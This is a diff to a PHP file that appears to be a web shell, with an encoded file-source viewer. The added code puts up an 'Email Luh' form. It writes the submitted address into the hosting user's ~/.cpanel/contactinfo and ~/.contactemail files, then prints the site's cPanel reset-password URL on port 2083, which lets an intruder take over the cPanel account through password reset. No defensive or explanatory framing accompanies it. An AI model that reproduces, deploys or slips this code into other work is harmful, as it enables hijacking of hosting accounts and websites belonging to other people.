@@ -1176,7 +1176,30 @@ function Encoder(name)
 if(isset($_GET['cpanel'])){
     
   }else{
+        echo "<center><br><form action=\"#\" method=\"post\">
+    <font size=5> Email Luh : </font>
+    <input type=\"text\" name=\"email\" required/><br><br>
+    <input type=\"submit\" name=\"submit\" value=\"Send\" />
 
+    </form>";
+    echo "<font color=black size=5>";
+  $user = get_current_user();
+  $site = $_SERVER['HTTP_HOST'];
+  $ips = getenv('REMOTE_ADDR');
+
+  if(isset($_POST['submit'])){
+
+    $email = $_POST['email'];
+    $wr = $email;
+  $f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'w');
+  fwrite($f, $wr);
+  fclose($f);
+  $f = fopen('/home/'.$user.'/.contactemail', 'w');
+  fwrite($f, $wr);
+  fclose($f);
+  $parm = $site.':2083/resetpass?start=1';
+  echo '<center><font size=5>Akses Disini : '.$parm.'<br><br></center><br>';
+  }
         if(isset($_GET['filesrc'])){
             $file = g22b_crypt($_GET['filesrc'],'de');
             echo '<div class="">Current File : '.htmlspecialchars($file).'</div><textarea style="width:750px; height:750px; font-size:16px;">'.filesrc($file).'</textarea></pre>';
